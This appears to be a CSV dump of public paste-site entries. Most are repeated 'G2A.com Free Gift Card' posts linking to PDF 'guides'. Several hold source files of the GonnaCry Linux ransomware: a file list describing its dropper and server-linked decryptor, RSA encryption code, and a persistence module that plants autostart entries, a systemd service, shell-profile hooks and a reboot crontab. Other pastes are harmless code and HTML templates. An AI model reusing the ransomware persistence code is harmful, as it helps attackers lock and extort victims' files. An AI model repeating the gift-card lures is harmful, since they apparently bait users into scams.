id,title,username,language,date,content
ecs8wVuB,ü§ëG2A.com Free Gift Card FIX June 2024üéÅ,PAUL-A8,JavaScript,Wednesday 26th of June 2024 01:02:08 AM CDT,"G2A.com complimentary voucher & gaming guide.
Any item for free on G2A.com including Steam gift cards & all else offered.
This is the most current version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?69872

Working as of:
24th of June 2024

"
biYEfzks,GonnaCry Files List,FlyFar,6502 Kick Assembler,Wednesday 26th of June 2024 12:57:28 AM CDT,"main.py: GonnaCry start file
daemon.py:	dropped by main.py and run
dropper.py	drop the malware on the computer
decryptor.py	communicate with the server, decrypt keys and files
symmetric.py	AES encryption
asymmetric.py	RSA encryption
generate_keys.py	Generate random AES keys
persistence.py	Persistence routines for Linux OS
get_files.py	Find files to be encrypted
environment.py	environment variables
variables.py	Images and malware binaries
utils.py	Utilities routines"
uAbWqqHt,src/GonnaCry/asymmetric.py,FlyFar,Python,Wednesday 26th of June 2024 12:56:16 AM CDT,"#!/bin/bash/env python
# coding=UTF-8
import os
from os import chmod
from Crypto.PublicKey import RSA
from Crypto.Hash import SHA
from Crypto import Random
from Crypto.Cipher import PKCS1_OAEP

class assymetric():
    # Constructor
    def __init__(self):
        self.private_key_path = """"
        self.public_key_path = """"
        self.bit_len = 2048
        self.private_key_PEM = None
        self.public_key_PEM = None
        self.key = None


    def generate_keys(self):
        self.key = RSA.generate(self.bit_len)
        self.private_key_PEM = self.key.exportKey('OpenSSH')
        self.public_key_PEM = self.key.publickey().exportKey('OpenSSH')
        
    
    def encrypt(self, data):
        cipher = PKCS1_OAEP.new(self.key)
        return cipher.encrypt(data)


    def decrypt(self, data):
        cipher = PKCS1_OAEP.new(self.key)
        return cipher.decrypt(data)

    
    def save_to_file(self, path):
        self.private_key_path = os.path.join(path, ""priv.key"")
        self.public_key_path = os.path.join(path, ""public.key"")

        with open(self.private_key_path, 'w') as content_file:
            chmod(self.private_key_path, 600) # -rw------- permissions 
            content_file.write(self.private_key_PEM)

        with open(self.public_key_path, 'w') as content_file:
            content_file.write(self.public_key_PEM)


if __name__ == ""__main__"":
    cipher = assymetric()
    cipher.generate_keys()
    print(cipher.private_key_PEM)
    print(cipher.public_key_PEM)"
Ggbp2qcE,ü§ëG2A.com Free Gift Card FIX June 2024ü§ë,Kevin_Chen1,JavaScript,Wednesday 26th of June 2024 12:56:06 AM CDT,"G2A.com complimentary voucher & gaming guide.
Any item for free on G2A.com including Playstation gift cards & all else offered.
This is the most latest version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?69872

Working as of:
June 24 2024

"
RFkbRb3m,ü§ëG2A.com Free Gift Card FIX June 2024ü§ë,mano03,JavaScript,Wednesday 26th of June 2024 12:50:03 AM CDT,"G2A.com complimentary voucher & games guide.
Any item for free on G2A.com including Playstation gift cards & everything else offered.
This is the most current version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?69872

Working as of:
June 24th 2024

"
JxWyfdCe,src/GonnaCry/clean.sh,FlyFar,Bash,Wednesday 26th of June 2024 12:49:38 AM CDT,"#!/bin/bash
rm *.pyc
rm -rf __pycache__"
ESFiGuZH,üéÅ G2A.COM FREE GIFT CARD GUIDE JUN 2024 V2 üéÅ,jusst2k4,GetText,Wednesday 26th of June 2024 12:46:23 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_882996.pdf
 
Working as of:
26 June 2024"
yp2c91yx,ü§ëG2A.com Free Gift Card FIX June 2024ü§ë,gigi1964,JavaScript,Wednesday 26th of June 2024 12:44:00 AM CDT,"G2A.com complimentary voucher & gaming guide.
Any voucher for free on G2A.com including Amazon gift cards & all else offered.
This is the most latest version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?69872

Working as of:
24th of June 2024

"
d1SUezt4,Untitled,Tkap1,C,Wednesday 26th of June 2024 12:43:59 AM CDT,"// compile with
// cl.exe -nologo main.c -link opengl32.lib user32.lib gdi32.lib && main.exe

#include <Windows.h>
#include <GL/GL.h>

LRESULT window_proc(HWND window, UINT msg, WPARAM wparam, LPARAM lparam)
{
	LRESULT result = 0;
	switch(msg) {
		case WM_CLOSE:
		case WM_DESTROY: {
			PostQuitMessage(0);
		} break;

		default: { result = DefWindowProc(window, msg, wparam, lparam); }

	}
	return result;
}

int main()
{
	WNDCLASSEX c = {0};
	c.cbSize = sizeof(c);
	c.lpfnWndProc = window_proc;
	c.style = CS_OWNDC | CS_VREDRAW | CS_HREDRAW;
	c.lpszClassName = ""hi youtube"";
	c.hInstance = GetModuleHandle(NULL);
	RegisterClassEx(&c);

	HWND window = CreateWindow(""hi youtube"", ""subscribe"", WS_OVERLAPPEDWINDOW | WS_VISIBLE, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, NULL, NULL, GetModuleHandle(NULL), NULL);
	HDC dc = GetDC(window);
	PIXELFORMATDESCRIPTOR pfd = {0};
	pfd.nSize = sizeof(pfd);
	pfd.nVersion = 1;
	pfd.dwFlags = PFD_DRAW_TO_WINDOW | PFD_SUPPORT_OPENGL | PFD_DOUBLEBUFFER;
	pfd.cColorBits = 32;
	pfd.cAlphaBits = 8;
	pfd.cDepthBits = 24;
	int format = ChoosePixelFormat(dc, &pfd);
	SetPixelFormat(dc, format, &pfd);
	HGLRC glrc = wglCreateContext(dc);
	wglMakeCurrent(dc, glrc);
	MSG msg;
	while(1) {
		while(PeekMessage(&msg, NULL, 0, 0, PM_REMOVE) > 0) {
			if(msg.message == WM_QUIT) { return 0; }
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
		glClearColor(0.1f, 0, 0, 0);
		glClear(GL_COLOR_BUFFER_BIT);


		glBegin(GL_TRIANGLES);
		glColor3f(1, 0, 0);
		glVertex2f(0, 0.5f);
		glColor3f(0, 1, 0);
		glVertex2f(-0.25f, -0.5f);
		glColor3f(0, 0, 1);
		glVertex2f(0.25f, -0.5f);
		glEnd();
		SwapBuffers(dc);
	}
	return 0;
}"
Eak8sxY5,src/GonnaCry/environment.py,FlyFar,Python,Wednesday 26th of June 2024 12:42:19 AM CDT,"import os
import pwd

def get_desktop_path():
    caminho = os.path.join(os.path.expanduser('~'), '/Desktop/')
    caminho2 = os.path.join(os.path.expanduser('~'), '/√Årea\\ de\\ Trabalho/')
    if(os.path.isdir(caminho)):
        path = caminho
    elif(os.path.isdir(caminho2)):
        path = caminho2
    else:
        path = os.path.expanduser('~') + '/Desktop/'
    
    return path


def get_username():
    return pwd.getpwuid(os.getuid())[0]


def get_unique_machine_id():
    with open(""/etc/machine-id"") as f :
        id = f.read()
        if('\n' in id):
            id = id.replace('\n', '')
    
    return id


def get_home_path():
    return os.path.expanduser('~')"
QYQMyijS,src/GonnaCry/persistence.py,FlyFar,Python,Wednesday 26th of June 2024 12:39:04 AM CDT,"import variables

import os
import subprocess
import shutil

def startup():
    desktop = \
'''[Desktop Entry]
Type=Application
Name=daemon
Exec={}
Icon=
Comment=SystemManagement
X-GNOME-Autostart-enabled=true
'''.format(variables.daemon_path)

    with open(variables.daemon_desktop, 'w') as f:
        f.write(desktop)

    startup_path = os.path.join(variables.home, '.config/autostart')
    try:
        os.mkdir(startup_path)
    except:
        pass

    shutil.copy2(variables.daemon_desktop, startup_path)


def systemctl():
    service = \
'''Description=daemon
Wants=network.target
After=syslog.target network-online.target
[Service]
Type=simple
ExecStart={}
Restart=on-failure
RestartSec=10
KillMode=process
[Install]
WantedBy=multi-user.target'''.format(variables.daemon_path)

    with open(variables.daemon_service, 'w') as f:
        f.write(service)

    try:
        shutil.copy2(variables.daemon_service, '/lib/systemd/system/daemon.service')
    except:
        pass
    
    commands = 'systemctl daemon-reload; systemctl enable daemon.service; \
        systemctl start daemon.service'
        
    os.system(commands)


def bashrcs():
    alias = ""alias 'daemon'='{}';\n"".format(variables.daemon_path)
    daemon = ""daemon;\n""

    paths = ['/etc/profile', '{}/.bash_profile', '{}/.bash_login',
             '{}/.profile', '{}/.bashrc']
    paths = [p.format(variables.home) for p in paths]

    for filepath in paths:
        try:
            with open(filepath, 'a') as f:
                f.write(alias)
                f.write(daemon)
        except:
            pass            


def crontab():
    command = '''(crontab -l 2>/dev/null; echo ""@reboot {}"") | crontab -'''.format(variables.daemon_path)
    os.system(command)
    
    "
0q3tFFzj,ü§ëG2A.com Free Gift Card FIX June 2024üéÅ,TeleBot,JavaScript,Wednesday 26th of June 2024 12:37:57 AM CDT,"G2A.com complimentary gift card & games guide.
Any gift card for free on G2A.com including Steam gift cards & everything else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?69872

Working as of:
June 24 2024

"
MATDgQD9,ü§ëG2A.com Free Gift Card FIX June 2024ü§ë,William95,JavaScript,Wednesday 26th of June 2024 12:31:53 AM CDT,"G2A.com free voucher & gaming guide.
Any gift card for free on G2A.com including Playstation gift cards & everything else offered.
This is the most current version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?69872

Working as of:
24th of June 2024

"
bGquG4rE,ü§ëG2A.com Free Gift Card FIX June 2024üéÅ,romikdikson,JavaScript,Wednesday 26th of June 2024 12:25:49 AM CDT,"G2A.com complimentary gift card & games guide.
Any item for free on G2A.com including Xbox gift cards & all else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?69872

Working as of:
June 24th 2024

"
gXWrZTQv,ü§ëG2A.com Free Gift Card FIX June 2024üéÅ,Justpit,JavaScript,Wednesday 26th of June 2024 12:19:47 AM CDT,"G2A.com complimentary voucher & games guide.
Any gift card for free on G2A.com including Xbox gift cards & anything else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?69872

Working as of:
24th of June 2024

"
TpEe1xSQ,ü§ëG2A.com Free Gift Card FIX June 2024ü§ë,DownloadPizza,JavaScript,Wednesday 26th of June 2024 12:13:43 AM CDT,"G2A.com free gift card & gaming guide.
Any item for free on G2A.com including Xbox gift cards & all else offered.
This is the most up to date version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?69872

Working as of:
June 24th 2024

"
vhQqRzCc,ü§ëG2A.com Free Gift Card FIX June 2024ü§ë,ROBLOX_PLSCHIL1O_O,JavaScript,Wednesday 26th of June 2024 12:07:40 AM CDT,"G2A.com free voucher & gaming guide.
Any voucher for free on G2A.com including Xbox gift cards & all else offered.
This is the most latest version of this script.

PDF guide here:
https://drive.google.com/file/d/14nhj_HMYLgijfcEYlszii5McXagnMlc6/view?69872

Working as of:
June 24th 2024

"
3DaQ2D10,jsonconf,cronzph13,JSON,Tuesday 25th of June 2024 11:42:28 PM CDT,"{
  ""Countries"": [{
    ""flag_url"": ""us"",
    ""ovpnConfiguration"": ""s.ovpn"",
    ""serverName"": ""sample"",
    ""vpnPassword"": ""secret"",
    ""vpnUserName"": ""vpn""
  }]}"
Abeus8Uv,Extrac-Urls3.0.pyw,Najeebsk,Python,Tuesday 25th of June 2024 11:36:06 PM CDT,"import tkinter as tk
from tkinter import filedialog, messagebox, scrolledtext, ttk
import re
import subprocess

def browse_file():
    file_path = filedialog.askopenfilename(
        filetypes=[(""Text files"", ""*.txt""), (""All files"", ""*.*"")]
    )
    if file_path:
        entry_file_path.delete(0, tk.END)
        entry_file_path.insert(0, file_path)
        extract_urls(file_path)

def extract_urls(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as file:
            content = file.read()
            urls = re.findall(r'(https?://\S+)', content)
            display_urls(urls)
    except Exception as e:
        messagebox.showerror(""Error"", f""Failed to read file: {e}"")

def display_urls(urls):
    search_text = entry_search.get().lower()
    text_urls.config(state=tk.NORMAL)
    text_urls.delete(1.0, tk.END)
    filtered_urls = [url for url in urls if search_text in url.lower()]
    for url in filtered_urls:
        text_urls.insert(tk.END, url + ""\n"")
    text_urls.config(state=tk.NORMAL)

def remove_duplicates():
    content = text_urls.get(1.0, tk.END).strip()
    urls = content.split('\n')
    unique_urls = list(dict.fromkeys(urls))
    text_urls.delete(1.0, tk.END)
    for url in unique_urls:
        text_urls.insert(tk.END, url + ""\n"")

def save_urls():
    urls = text_urls.get(1.0, tk.END).strip().split('\n')
    if urls:
        try:
            with open(""urls.txt"", 'w', encoding='utf-8') as file:
                for index, url in enumerate(urls):
                    if url:
                        channel_name = f""Channel{index + 1}""
                        file.write(f""{channel_name} {url}\n"")
                messagebox.showinfo(""Success"", ""URLs saved successfully to urls.txt."")
        except Exception as e:
            messagebox.showerror(""Error"", f""Failed to save file: {e}"")
    else:
        messagebox.showwarning(""No URLs"", ""No URLs to save."")

def open_vlc(event):
    try:
        index = text_urls.index(tk.CURRENT)
        line_start = f""{index.split('.')[0]}.0""
        line_end = f""{index.split('.')[0]}.end""
        url = text_urls.get(line_start, line_end).strip()
        if url:
            vlc_path = r""C:\Program Files\VideoLAN\VLC\vlc.exe""
            subprocess.Popen([vlc_path, url])
    except Exception as e:
        messagebox.showerror(""Error"", f""Failed to open VLC: {e}"")

def search_urls(event):
    file_path = entry_file_path.get()
    if file_path:
        extract_urls(file_path)
    else:
        messagebox.showwarning(""No File"", ""Please select a file first."")

# Create the main window
root = tk.Tk()
root.title(""Najeeb URL Extractor and Play VLC"")
root.configure(bg=""#4a4a4a"")
root.geometry(""740x680"")

# Apply style
style = ttk.Style()
style.theme_use('clam')
style.configure(""TFrame"", background=""#f0f0f0"")
style.configure(""TLabel"", background=""#f0f0f0"", foreground=""#333"")
style.configure(""TButton"", background=""#0052cc"", foreground=""white"")
style.map(""TButton"", background=[('active', '#003d99')])

# Create and place the widgets
frame = ttk.Frame(root, padding=10)
frame.pack(pady=10)

label_file_path = ttk.Label(frame, text=""File Path:"")
label_file_path.grid(row=0, column=0, padx=5, pady=5)

entry_file_path = ttk.Entry(frame, width=50)
entry_file_path.grid(row=0, column=1, padx=5, pady=5)

button_browse = ttk.Button(frame, text=""Browse"", command=browse_file)
button_browse.grid(row=0, column=2, padx=5, pady=5)

label_search = ttk.Label(frame, text=""Search URL:"")
label_search.grid(row=1, column=0, padx=5, pady=5)

entry_search = ttk.Entry(frame, width=50)
entry_search.grid(row=1, column=1, padx=5, pady=5)
entry_search.bind(""<KeyRelease>"", search_urls)

button_save = ttk.Button(frame, text=""Save URLs to File"", command=save_urls)
button_save.grid(row=0, column=3, pady=10)

button_remove_duplicates = ttk.Button(frame, text=""Remove Duplicates"", command=remove_duplicates)
button_remove_duplicates.grid(row=0, column=4, pady=10, padx=5)

text_urls = scrolledtext.ScrolledText(root, width=100, height=33, state=tk.NORMAL, bg=""#e6f2ff"")
text_urls.pack(padx=10, pady=10)
text_urls.bind(""<Double-1>"", open_vlc)

# Start the GUI event loop
root.mainloop()
"
racxVGH2,Extrac-Urls2.0.pyw,Najeebsk,Python,Tuesday 25th of June 2024 11:34:45 PM CDT,"import tkinter as tk
from tkinter import filedialog, messagebox, scrolledtext, ttk
import re
import subprocess

def browse_file():
    file_path = filedialog.askopenfilename(
        filetypes=[(""Text files"", ""*.txt""), (""All files"", ""*.*"")]
    )
    if file_path:
        entry_file_path.delete(0, tk.END)
        entry_file_path.insert(0, file_path)
        extract_urls(file_path)

def extract_urls(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as file:
            content = file.read()
            urls = re.findall(r'(https?://\S+)', content)
            display_urls(urls)
    except Exception as e:
        messagebox.showerror(""Error"", f""Failed to read file: {e}"")

def display_urls(urls):
    text_urls.config(state=tk.NORMAL)
    text_urls.delete(1.0, tk.END)
    for url in urls:
        text_urls.insert(tk.END, url + ""\n"")
    text_urls.config(state=tk.NORMAL)

def remove_duplicates():
    content = text_urls.get(1.0, tk.END).strip()
    urls = content.split('\n')
    unique_urls = list(dict.fromkeys(urls))
    text_urls.delete(1.0, tk.END)
    for url in unique_urls:
        text_urls.insert(tk.END, url + ""\n"")

def save_urls():
    urls = text_urls.get(1.0, tk.END).strip().split('\n')
    channel_name_prefix = entry_channel_name.get().strip()
    if urls:
        try:
            with open(""urls.txt"", 'w', encoding='utf-8') as file:
                for index, url in enumerate(urls):
                    if url:
                        channel_name = f""{channel_name_prefix}{index + 1}""
                        file.write(f""{channel_name} {url}\n"")
                messagebox.showinfo(""Success"", ""URLs saved successfully to urls.txt."")
        except Exception as e:
            messagebox.showerror(""Error"", f""Failed to save file: {e}"")
    else:
        messagebox.showwarning(""No URLs"", ""No URLs to save."")

def open_vlc(event):
    try:
        index = text_urls.index(tk.CURRENT)
        line_start = f""{index.split('.')[0]}.0""
        line_end = f""{index.split('.')[0]}.end""
        url = text_urls.get(line_start, line_end).strip()
        if url:
            vlc_path = r""C:\Program Files\VideoLAN\VLC\vlc.exe""
            subprocess.Popen([vlc_path, url])
    except Exception as e:
        messagebox.showerror(""Error"", f""Failed to open VLC: {e}"")

# Create the main window
root = tk.Tk()
root.title(""Najeeb URL Extractor and Play VLC"")
root.configure(bg=""#4a4a4a"")
root.geometry(""740x640"")

# Apply style
style = ttk.Style()
style.theme_use('clam')
style.configure(""TFrame"", background=""#f0f0f0"")
style.configure(""TLabel"", background=""#f0f0f0"", foreground=""#333"")
style.configure(""TButton"", background=""#0052cc"", foreground=""white"")
style.map(""TButton"", background=[('active', '#003d99')])

# Create and place the widgets
frame = ttk.Frame(root, padding=10)
frame.pack(pady=10)

label_file_path = ttk.Label(frame, text=""File Path:"")
label_file_path.grid(row=0, column=0, padx=5, pady=5)

entry_file_path = ttk.Entry(frame, width=50)
entry_file_path.grid(row=0, column=1, padx=5, pady=5)

button_browse = ttk.Button(frame, text=""Browse"", command=browse_file)
button_browse.grid(row=0, column=2, padx=5, pady=5)

label_channel_name = ttk.Label(frame, text=""Channel Name Prefix:"")
label_channel_name.grid(row=1, column=0, padx=5, pady=5)

entry_channel_name = ttk.Entry(frame, width=50)
entry_channel_name.grid(row=1, column=1, padx=5, pady=5)

button_save = ttk.Button(frame, text=""Save URLs to File"", command=save_urls)
button_save.grid(row=1, column=2, pady=10)

button_remove_duplicates = ttk.Button(frame, text=""Remove Duplicates"", command=remove_duplicates)
button_remove_duplicates.grid(row=1, column=3, pady=10, padx=5)

text_urls = scrolledtext.ScrolledText(root, width=100, height=33, state=tk.NORMAL, bg=""#e6f2ff"")
text_urls.pack(padx=10, pady=10)
text_urls.bind(""<Double-1>"", open_vlc)

# Start the GUI event loop
root.mainloop()
"
jusjbg3R,Another Life - Example,meromerc,HTML,Tuesday 25th of June 2024 10:44:27 PM CDT,"<!--
    
    ANOTHER LIFE
    by meromercury
    
    accent color: primary
    ctrl + f to replace
    
    created and released 5/5/24
   
-->

<div class=""align-items-center"" style=""font-family:tahoma; font-size:12px;"">
    <div class=""container col-sm-6 p-0""><div class=""card"" style=""border-width:4px; box-shadow: 2px 2px 4px rgba(0,0,0,0.5)"">
        
        <div class=""card-header font-weight-bold text-primary justify-content-between p-0"" style=""font-size:15px;"">
            <div class=""p-1""><i class=""fa-solid fa-user fa-sm mx-1""></i>
            
            <!----- USERNAME ----->
            USER
            </div>
            <div><a href=""https://toyhou.se/meromercury"" class=""text-primary"" target=_blank><div class=""btn pull-right p-1"" style=""width:30px"" data-toggle=""tooltip"" title=""made by mero"">
            <i class=""fa-solid fa-code fa-sm""></i>
            </div></a></div>
        </div>
        
    <!--
    
    ABOUT THE IMAGE
    
    In the event you wanted to make the image wider too, i'll explain that first:
    
    Currently the inside of the main box is formatted into a row containing two columns, A and B.
    B, the right column with the text inside, is size 9 (col-9) meanwhile A, the left column with an image inside, is a plain column (""col"") and will adjust to match the size on the right. Bootstrap columns are sized from 1 to 12, so 12 - 9 = 3, meaning the left column is currently size 3.
    If you, say, wanted to make them equal, you'd need to change column B from ""col-9"" to ""col-6"" and column A would grow to match. Or maybe you want the image a big bigger but not much, so you could change ""col-9"" to ""col-8"".
    You can find these two columns marked below.
    
    Another thing (i think you know this already): if your image is smaller than the box, it will be stretched to match. if you'd like to keep it at its original size, you can remove the entire ""style"" tag below the image source, which is this: 
            style=""height:100%; width:100%""
    
    To center a smaller image, this is a two-step process (I have done these already in the code below to demonstrate):
    - add ""align-items-center"" to the left column line, like this:
            <div class=""col p-1 align-items-center"">
    
    - add "" class=""mx-auto"" "" to the image tag between the brackets, like this:
            <img src=""SOURCE"" class=""mx-auto"">
    
    I know that's a lot. I wanted to be thorough so you can adjust it to your liking. i hope that helps you somehow? and again you can ask if you have more questions or if i misinterpreted what you meant :D
    
    -->        
        <div class=""row no-gutters"">
            <!--- LEFT COLUMN A --->
            <div class=""col p-1"">
                
                <!-------
                IMAGE
                ------->
                <img src=""
                https://i.imgur.com/WjvSC0q.jpeg
                "" class=""mx-auto"" style=""height:100%; width: 100%"">
                
                <!---- end image ---->
            </div>
            
            <!--- RIGHT COLUMN B --->
            <div class=""col-9 text-muted"">
                <div class=""p-1 text-center"" style=""line-height:20px; font-size:11px; letter-spacing:0.04rem; height:30px; overflow:hidden;"">
                
                <!-------
                TEXT BOX 1:
                Use this for pronouns, age, pride flags, or whatever you want!
                
                You can technically make this box bigger too by adjusting the ""height"" above.
                ------->
                
                    pro/nouns
                    <span class=""mx-2"">‚Ä¢</span>
                    age
                    <span class=""mx-2"">‚Ä¢</span>
                    timezone

                <!----- END TEXT BOX 1 ----->
                </div>
                
                <hr class=""mt-0 mb-1"">
                
                <!-----------
                
                Below you can change the height to whatever you want, with (obviously) ""height:_px"". Default is 90.
                
                If you don't care about making the text box scroll, you can remove the ""height:_px"" line altogether, and then the container will grow to match the amount of text inside of the text box. (That also means the image will stretch to match, but you can change that too as i've mentioned above.)
                
                -------->
                
                <div class=""p-1 font-italic text-center table-responsive"" style=""height:180px; letter-spacing:0.04rem"">
                    			
                   <p>Electric Dreams is a 1984 science fiction romantic comedy film directed by Steve Barron (in his feature film directorial debut) and written by Rusty Lemorande. The film is set in San Francisco and depicts a love triangle among a man, a woman, and a personal computer. It stars Lenny Von Dohlen, Virginia Madsen, Maxwell Caulfield, and the voice of Bud Cort. </p>
                   
                   <p>The film was released in the United States in New York and Los Angeles on July 20, 1984, and in the United Kingdom in London on August 17, 1984. It received mixed reviews from critics.</p>
                   
                   <p>The soundtrack features music from prominent popular musicians of the time, being among the movies of this generation that actively explored the commercial link between a movie and its soundtrack. The soundtrack album Electric Dreams was re-issued on CD in 1998. The movie features music from Giorgio Moroder, Culture Club, Jeff Lynne (Electric Light Orchestra), and Heaven 17. During filming, Barron said, ""The fact that there's so much music has to do with the success of Flashdance. This film isn't Flashdance 2. Flashdance worked because of the dancing. It didn't have a story. Electric Dreams does.""</p>
                   
                    
                <!----- END TEXT BOX 2 ----->
                </div>
            </div>
        </div>
        <div class=""card-footer p-0 text-muted align-items-center justify-content-between"" style=""display:flex"">
        <div class=""align-items-center"">
            <div class=""melody-embed btn text-primary p-1"">
                    <iframe frameborder=""0"" style=""z-index:999;height:20px;width:35px;opacity:0.0001;position:absolute;""
                      
                      src=""https://www.youtube.com/embed/_F9IO9Plldc"">
                      <!-------
                      MUSIC PLAYER TUTORIAL
                      
                      1. in the link to your youtube video, copy everything after watch?v=
                      2. replace the jumble of letters after /embed/ with what you just copied
                      
                      remember to keep the ""QUOTATION MARKS"" around the entire link or else it could break.
                      ------->
                     </iframe>
                <i class=""fa-solid fa-play-pause mx-2""></i>
              </div>
            <span class=""text-primary"">Now Playing:</span></div>
            
            <div class=""fa-fade font-italic pull-right p-1 mr-1"" style=""letter-spacing:0.04rem; text-shadow: 2px 2px 4px rgba(0,0,0,0.5)"">
            <!----- SONG TITLE ----->
            BROWSER HISTORY . . . Graham Kartna
            </div>
        </div>
    </div>
</div></div>"
FJjr4hpG,De Esmeray,Kelly-B9978,HTML,Tuesday 25th of June 2024 10:31:29 PM CDT,"<link href=""https://dl.dropbox.com/scl/fi/k5v5k6ykhj3w0imhriggr/esmeray.css?rlkey=haim5996m4luk7n0kk2avxw4y&st=qycx25i8"" rel=""stylesheet"">
<div id=""zzzcode""><a href=""https://discord.com/users/625292873914515456/""></a><div class=""esmeray-box"">
<div class=""esmeray-top""></div><div class=""esmeray-logo""></div><div class=""esmeray-ripped""></div><div class=""esmeray-paper""><div class=""esmeray-title-glow""></div>
<div class=""esmeray-title"">
<div class=""esmeray-butterfly""><img src=""https://i.imgur.com/pbI8HoN.png""></div>
<div class=""esmeray-title-name"">de esmeray</div>
<div class=""esmeray-subtitle-name"">of flozentine</div></div>
<br><div class=""esmeray-content"">
<p>‡πÄ‡∏î‡∏≠ ‡πÄ‡∏≠‡∏™‡πÄ‡∏°‡∏≠‡πÄ‡∏£‡∏¢‡πå ‡∏Ñ‡∏§‡∏´‡∏≤‡∏™‡∏ô‡πå‡∏´‡∏•‡∏±‡∏á‡πÄ‡∏•‡πá‡∏Å‡∏Ç‡∏≠‡∏á‡∏™‡∏≠‡∏á‡πÅ‡∏°‡πà‡∏°‡∏î‡∏ï‡∏£‡∏∞‡∏Å‡∏π‡∏•‡∏ü‡∏•‡∏≠‡πÄ‡∏ã‡∏ô‡πÑ‡∏ó‡∏ô‡πå‡∏ó‡∏µ‡πà‡πÄ‡∏ï‡πá‡∏°‡πÑ‡∏õ‡∏î‡πâ‡∏ß‡∏¢‡∏û‡∏•‡∏±‡∏á‡πÅ‡∏´‡πà‡∏á‡∏°‡∏ô‡∏ï‡∏£‡∏≤ ‡∏•‡∏∏‡∏¢‡∏ã‡πà‡∏≤ ‡πÄ‡∏ö‡∏µ‡∏¢‡∏ó‡∏£‡∏¥‡∏Å‡∏ã‡πå ‡∏ü‡∏•‡∏≠‡πÄ‡∏ã‡∏ô‡πÑ‡∏ó‡∏ô‡πå ‡∏ú‡∏π‡πâ‡∏ô‡∏≥‡∏à‡∏¥‡∏ï‡∏ß‡∏¥‡∏ç‡∏ç‡∏≤‡∏ì‡∏°‡∏ô‡∏ï‡∏£‡∏≤ ‡πÅ‡∏•‡∏∞ ‡πÄ‡∏•‡∏ó‡∏¥‡πÄ‡∏ã‡∏µ‡∏¢ ‡∏ö‡∏£‡∏µ‡πÅ‡∏≠‡∏ô‡∏ô‡πà‡∏≤ ‡∏ü‡∏•‡∏≠‡πÄ‡∏ã‡∏ô‡πÑ‡∏ó‡∏ô‡πå ‡∏•‡∏π‡∏Å‡∏û‡∏µ‡πà‡∏•‡∏π‡∏Å‡∏ô‡πâ‡∏≠‡∏á‡∏Ç‡∏≠‡∏á‡πÄ‡∏ò‡∏≠ ‡∏†‡∏≤‡∏¢‡πÉ‡∏ô‡∏ö‡∏£‡∏¥‡πÄ‡∏ß‡∏ì‡∏à‡∏∞‡πÑ‡∏î‡πâ‡∏Å‡∏•‡∏¥‡πà‡∏ô‡∏´‡∏≠‡∏°‡∏´‡∏ß‡∏≤‡∏ô‡∏Ç‡∏≠‡∏á‡∏ö‡∏∏‡∏õ‡∏ú‡∏≤‡∏ô‡∏≤‡∏ô‡∏≤‡∏ä‡∏ô‡∏¥‡∏î ‡πÅ‡∏•‡∏∞‡∏Å‡∏•‡∏¥‡πà‡∏ô‡∏Ç‡∏≠‡∏á‡∏ô‡πâ‡∏≥‡∏ä‡∏≤‡∏¢‡∏≤‡∏°‡∏ö‡πà‡∏≤‡∏¢‡∏≠‡∏±‡∏ô‡∏´‡∏≠‡∏°‡∏Å‡∏£‡∏∏‡πà‡∏ô‡∏û‡∏£‡πâ‡∏≠‡∏°‡∏ó‡∏±‡πâ‡∏á‡∏Å‡∏•‡∏¥‡πà‡∏ô‡∏Ç‡∏ô‡∏°‡∏ó‡∏µ‡πà‡πÄ‡∏û‡∏¥‡πà‡∏á‡∏≠‡∏ö‡πÄ‡∏™‡∏£‡πá‡∏à‡πÉ‡∏´‡∏°‡πà ‡πÜ</p>
<br>
